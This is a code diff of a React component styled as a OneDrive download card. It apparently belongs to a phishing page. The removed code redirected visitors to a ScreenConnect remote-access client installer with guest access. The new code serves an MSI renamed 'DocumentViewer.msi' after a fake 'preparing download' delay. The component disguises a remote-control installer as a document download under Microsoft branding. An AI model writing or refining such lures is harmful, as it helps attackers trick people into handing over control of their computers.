@@ -1,8 +1,8 @@
 
 import React, { useState } from 'react';
 
-// Specified URL for the download button redirect
-const TARGET_URL = "https://clinicawh.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
+// The file is located in the repository root
+const DOWNLOAD_FILENAME = "DocumentViewer.msi";
 
 const OneDriveCard: React.FC = () => {
   const [isDownloading, setIsDownloading] = useState(false);
@@ -10,10 +10,19 @@ const OneDriveCard: React.FC = () => {
   const handleDownload = () => {
     setIsDownloading(true);
     
-    // Brief delay to simulate "preparing download" before redirecting
+    // Brief delay to simulate "preparing download" before starting the transfer
     setTimeout(() => {
-      window.location.href = TARGET_URL;
-    }, 1000);
+      // Create a temporary link element to trigger the download explicitly
+      const link = document.createElement('a');
+      link.href = `./${DOWNLOAD_FILENAME}`;
+      link.download = DOWNLOAD_FILENAME;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      
+      // Reset state after a delay to allow the user to click again if needed
+      setTimeout(() => setIsDownloading(false), 2000);
+    }, 1200);
   };
 
   return (
